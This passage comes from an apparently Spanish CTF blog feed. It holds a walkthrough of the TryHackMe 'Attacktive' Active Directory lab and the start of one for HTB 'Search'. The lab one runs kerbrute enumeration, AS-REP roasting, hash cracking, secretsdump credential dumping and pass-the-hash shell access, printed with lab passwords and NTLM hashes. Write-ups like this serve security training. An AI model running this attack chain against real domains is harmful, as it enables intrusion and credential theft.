Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2022-06-14T11:40:09
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a identificar el nombre de Dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;spookysec.local&lt;/code&gt; e introducirlo en nuestro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ping -c 1 spookysec.local
PING spookysec.local (10.10.165.157) 56(84) bytes of data.
64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms

--- spookysec.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop

2022/06/15 13:01:07 &amp;gt;  Using KDC(s):
2022/06/15 13:01:07 &amp;gt;   spookysec.local:88

2022/06/15 13:01:07 &amp;gt;  [+] svc-admin has no pre auth required.
2022/06/15 13:01:07 &amp;gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
2022/06/15 13:01:08 &amp;gt;  [+] VALID USERNAME:       james@spookysec.local
2022/06/15 13:01:24 &amp;gt;  [+] VALID USERNAME:       robin@spookysec.local
2022/06/15 13:01:39 &amp;gt;  [+] VALID USERNAME:       darkstar@spookysec.local
2022/06/15 13:02:07 &amp;gt;  [+] VALID USERNAME:       JAMES@spookysec.local
2022/06/15 13:02:30 &amp;gt;  [+] VALID USERNAME:       paradox@spookysec.local
2022/06/15 13:02:31 &amp;gt;  [+] VALID USERNAME:       administrator@spookysec.local
2022/06/15 13:03:06 &amp;gt;  [+] VALID USERNAME:       James@spookysec.local
2022/06/15 13:04:51 &amp;gt;  [+] VALID USERNAME:       backup@spookysec.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como vemos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc-admin&lt;/code&gt; seria vulnerable a un ataque de ASPREPRoast&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press &apos;q&apos; or Ctrl-C to abort, almost any other key for status
&quot;management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)&quot;     
1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos creamos un archivo de credenciales, con las credenciales obtenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;svc-admin: management2005
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        backup                                                  READ ONLY
        .\backup\*
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cuando Procedemos a descargar el archivo obtenemos un problema.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
0       10.10.165.157-backup__credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# mount -t cifs //10.10.165.157/backup /mnt/ -o username=&quot;svc-admin&quot;,password=&quot;management2005&quot;,domain=spookysec.local,rw
# ls -la /mnt                     
total 5
drwxr-xr-x  2 root root    0 abr  4  2020 .
drwxr-xr-x 20 root root 4096 may 31 21:36 ..
-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a leer el Archivo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cat /mnt/backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

# cat /mnt/backup_credentials.txt | base64 -d
backup@spookysec.local:backup2517860
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos guardamos las credenciales en el archivo Creds
Procedemos a enumerar con bloodhound.py el directorio activo&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# python3 bloodhound.py -u svc-admin -p &quot;management2005&quot; -d spookysec.local -ns 10.10.165.157 --zip
INFO: Found AD domain: spookysec.local
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 05S
INFO: Compressing output into 20220615135241_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;

Introducimos nuestras credenciales en Neo4J 
Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
./BloodHound --no-sandbox 2&amp;gt;/dev/null &amp;amp;                                                                                                                                
[2] 3424

Cargamos nuestro .zip
Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a intentar ejecutar la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Secretsdumps.py&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# evil-winrm -i 10.10.165.157 -u &apos;administrator&apos; -H &apos;0e0363213e37b94221497260b0bcb4fc&apos;
Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&amp;gt; whoami
thm-ad\administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Maquina Comprometida AD ~ K0H4ck&lt;/p&gt;</content><author><name>Pirrandi</name></author><category term="THM," /><category term="Enumeration," /><category term="SMB," /><category term="Kerbrute" /><category term="Userenum," /><category term="ASPREPRoast" /><category term="Attack," /><category term="Kerberoasting" /><category term="Attack," /><category term="Secretsdumps.py," /><category term="Maquina" /><category term="Gratuitas." /><summary type="html">Attacktive ~ Try Hack Me</summary></entry><entry><title type="html">Maquina Retirada Search de Hack The Box (Necesario VIP)</title><link href="http://localhost:4000/2022/06/05/Search-AD.html" rel="alternate" type="text/html" title="Maquina Retirada Search de Hack The Box (Necesario VIP)" /><published>2022-06-05T00:00:00-03:00</published><updated>2022-06-05T00:00:00-03:00</updated><id>http://localhost:4000/2022/06/05/Search-AD</id><content type="html" xml:base="http://localhost:4000/2022/06/05/Search-AD.html">&lt;h1 id=&quot;querier--hack-the-box&quot;&gt;Querier ~ Hack The Box&lt;/h1&gt;

&lt;p&gt;Realizamos el Primer escaneo con Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;$&quot; nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.129       &quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos con el siguiente escaneo de Nmap&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE       VERSION                                                                                                       
53/tcp    open  domain        Simple DNSPlus                                                                                                                                                                         
80/tcp    open  http          Microsoft IIS httpd 10.0         
| http-methods:                                                                                          
|_  Potentially risky methods: TRACE                                                                                                                                                                               
|_http-server-header: Microsoft-IIS/10.0     
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                           
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2021-12-24 18:38:51Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                                                                                     
135/tcp   open  msrpc         Microsoft Windows RPC                                                      
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                                                                        
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                
| Not valid before: 2020-08-11T08:13:35                                                                                                                                                                                                          
|_Not valid after:  2030-08-09T08:13:35                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                            
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0                                                    
| http-methods:                                                                                                         
|_  Potentially risky methods: TRACE                                                                                    
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS                                                                                               
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                                                                                             
| Not valid before: 2020-08-11T08:13:35                                                                                               
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
| tls-alpn:                                                                                                                                 
|_  http/1.1                              
445/tcp   open  microsoft-ds?                                                                                 
464/tcp   open  kpasswd5?                          
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                                                       
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                        
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                     
|_Not valid after:  2030-08-09T08:13:35            
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                                                     
|_Not valid after:  2030-08-09T08:13:35 
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                  
|_Not valid after:  2030-08-09T08:13:35                                                                                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.
|_http-server-header: Microsoft-IIS/10.0                              
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title.                                                                                                    
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH                                                                                                                      
| Not valid before: 2020-04-07T09:05:25                                                                                                     
|_Not valid after:  2030-04-05T09:05:25                                                                                                     
|_ssl-date: 2021-12-24T18:40:22+00:00; +1s from scanner time.                                            
| tls-alpn:                                                           
|_  http/1.1                                                                                                                                                             
9389/tcp  open  mc-nmf        .NET Message Framing                    
49667/tcp open  msrpc         Microsoft Windows RPC                   
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                    
49670/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49691/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49701/tcp open  msrpc         Microsoft Windows RPC                                 
49725/tcp open  msrpc         Microsoft Windows RPC                   
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
                                                                                                                                            
Host script results:                                                                                                                                                     
| smb2-security-mode:                                                                                                                                                    
|   2.02:                                                                                                
|_    Message signing enabled and required                                                                                                  
| smb2-time:                                                                        
|   date: 2021-12-24T18:39:43                                                                            
|_  start_date: N/A      
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos procedemos a añadir el commonName de la maquina al /etc/hosts/  –&amp;gt; search.htb research.htb&lt;/p&gt;

&lt;p&gt;Seguimos enumerando informcion, empezando por la pagina WEB&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.11.129 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS], X-Powered-By[ASP.NET]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar la pagina web visualmente.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encontramos la siguiente credencial y user &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.11.129/images/slide_2.jpg&quot;&lt;/span&gt;
User: &lt;span class=&quot;s2&quot;&gt;&quot;Hope Sharp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Pass: &lt;span class=&quot;s2&quot;&gt;&quot;IsolationIsKey?&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Verificamos con Crackmapexec la credencial obtenida para el usuario hope.sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u hope.sharp -p &apos;IsolationIsKey?&apos;&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a intentar conectarnos a los recursos de SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;&apos; -H 10.10.11.129                                                                                                                          &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos Usuarios del Sistema por SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    ..
        dr--r--r--                0 Tue Apr  7 20:12:58 2020    abril.suarez
        dr--r--r--                0 Fri Jul 31 15:11:32 2020    Angie.Duffy
        dr--r--r--                0 Fri Jul 31 14:35:32 2020    Antony.Russo
        dr--r--r--                0 Tue Apr  7 20:32:31 2020    belen.compton
        dr--r--r--                0 Fri Jul 31 14:37:36 2020    Cameron.Melendez
        dr--r--r--                0 Tue Apr  7 20:15:09 2020    chanel.bell
        dr--r--r--                0 Fri Jul 31 15:09:07 2020    Claudia.Pugh
        dr--r--r--                0 Fri Jul 31 14:02:04 2020    Cortez.Hickman
        dr--r--r--                0 Tue Apr  7 20:20:08 2020    dax.santiago
        dr--r--r--                0 Fri Jul 31 13:55:34 2020    Eddie.Stevens
        dr--r--r--                0 Thu Apr  9 22:04:11 2020    edgar.jacobs
        dr--r--r--                0 Fri Jul 31 14:39:50 2020    Edith.Walls
        dr--r--r--                0 Tue Apr  7 20:23:13 2020    eve.galvan
        dr--r--r--                0 Tue Apr  7 20:29:22 2020    frederick.cuevas
        dr--r--r--                0 Thu Apr  9 16:34:41 2020    hope.sharp
        dr--r--r--                0 Tue Apr  7 20:07:00 2020    jayla.roberts
        dr--r--r--                0 Fri Jul 31 15:01:06 2020    Jordan.Gregory
        dr--r--r--                0 Thu Apr  9 22:11:39 2020    payton.harmon
        dr--r--r--                0 Fri Jul 31 13:44:32 2020    Reginald.Morton
        dr--r--r--                0 Tue Apr  7 20:10:25 2020    santino.benjamin
        dr--r--r--                0 Fri Jul 31 14:21:42 2020    Savanah.Velazquez
